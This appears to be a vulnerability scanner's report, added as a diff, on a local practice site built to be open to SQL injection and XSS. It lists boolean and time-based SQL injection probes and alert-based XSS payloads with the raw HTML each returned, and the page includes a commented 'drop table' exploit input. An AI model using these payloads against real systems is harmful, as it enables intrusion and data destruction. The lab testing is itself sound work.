@@ -1,0 +1,709 @@
+Target: http://127.0.0.1:8000/
+Date: 12-07-2021 12:01
+
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql_insert='+or+1%3D1%23'; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'")]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+ negative Result: 
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'")]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql_insert="+or+1%3D1%23"; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"')]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+ negative Result: 
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'")]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql_insert='+or+1%3D1--'; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'")]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+ negative Result: 
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'")]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql_insert="+or+1%3D1--"; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"')]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+ negative Result: 
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"'), (9, "' or 1=2#'")]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql='+or+1%3D1%23'; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"'), (9, "' or 1=2#'"), (10, "' or sleep(5)--"), (11, "' or sleep(5)"), (12, '" or sleep(5)--'), (13, '" or sleep(5)')]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"'), (9, "' or 1=2#'"), (10, "' or sleep(5)--"), (11, "' or sleep(5)"), (12, '" or sleep(5)--'), (13, '" or sleep(5)')]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+ negative Result: 
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"'), (9, "' or 1=2#'"), (10, "' or sleep(5)--"), (11, "' or sleep(5)"), (12, '" or sleep(5)--'), (13, '" or sleep(5)')]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql="+or+1%3D1%23"; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"'), (9, "' or 1=2#'"), (10, "' or sleep(5)--"), (11, "' or sleep(5)"), (12, '" or sleep(5)--'), (13, '" or sleep(5)')]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[(4, '" or 1=1#"')]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+ negative Result: 
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"'), (9, "' or 1=2#'"), (10, "' or sleep(5)--"), (11, "' or sleep(5)"), (12, '" or sleep(5)--'), (13, '" or sleep(5)')]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql='+or+1%3D1--'; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"'), (9, "' or 1=2#'"), (10, "' or sleep(5)--"), (11, "' or sleep(5)"), (12, '" or sleep(5)--'), (13, '" or sleep(5)')]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"'), (9, "' or 1=2#'"), (10, "' or sleep(5)--"), (11, "' or sleep(5)"), (12, '" or sleep(5)--'), (13, '" or sleep(5)')]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+ negative Result: 
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"'), (9, "' or 1=2#'"), (10, "' or sleep(5)--"), (11, "' or sleep(5)"), (12, '" or sleep(5)--'), (13, '" or sleep(5)')]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/sqlinjection.html?sql="+or+1%3D1--"; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"'), (9, "' or 1=2#'"), (10, "' or sleep(5)--"), (11, "' or sleep(5)"), (12, '" or sleep(5)--'), (13, '" or sleep(5)')]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[(8, '" or 1=1--"')]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+ negative Result: 
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"'), (9, "' or 1=2#'"), (10, "' or sleep(5)--"), (11, "' or sleep(5)"), (12, '" or sleep(5)--'), (13, '" or sleep(5)')]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+-----------------------------------------------------------------------------
+Possible XSS (Permanent): http://127.0.0.1:8000/sqlinjection.html?sql_insert=<img src='x' onerror='alert(1)'>; Evidence: <img src='x' onerror='alert(1)'> found in response
+request answer:
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"'), (9, "' or 1=2#'"), (10, "' or sleep(5)--"), (11, "' or sleep(5)"), (12, '" or sleep(5)--'), (13, '" or sleep(5)'), (14, "<img src='x' onerror='alert(1)'>")]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[(13, '" or sleep(5)')]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+-----------------------------------------------------------------------------
+Possible XSS (Permanent): http://127.0.0.1:8000/sqlinjection.html?sql_insert=<script> alert(1) </script>; Evidence: <script> alert(1) </script> found in response
+request answer:
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"'), (9, "' or 1=2#'"), (10, "' or sleep(5)--"), (11, "' or sleep(5)"), (12, '" or sleep(5)--'), (13, '" or sleep(5)'), (14, "<img src='x' onerror='alert(1)'>"), (15, '<script> alert(1) </script>')]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[(13, '" or sleep(5)')]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+-----------------------------------------------------------------------------
+Possible XSS (Permanent): http://127.0.0.1:8000/sqlinjection.html?sql=<script> alert(1) </script>; Evidence: <script> alert(1) </script> found in response
+request answer:
+<html>
+    <head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p id="Welcometext">An SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "' or 1=1#'"), (3, "' or 1=2#'"), (4, '" or 1=1#"'), (5, "' or 1=2#'"), (6, "' or 1=1--'"), (7, "' or 1=2#'"), (8, '" or 1=1--"'), (9, "' or 1=2#'"), (10, "' or sleep(5)--"), (11, "' or sleep(5)"), (12, '" or sleep(5)--'), (13, '" or sleep(5)'), (14, "<img src='x' onerror='alert(1)'>"), (15, '<script> alert(1) </script>')]</output>
+            </label>
+        </form>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[(15, '<script> alert(1) </script>')]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+        </p>
+    </body>
+</html>
+-----------------------------------------------------------------------------
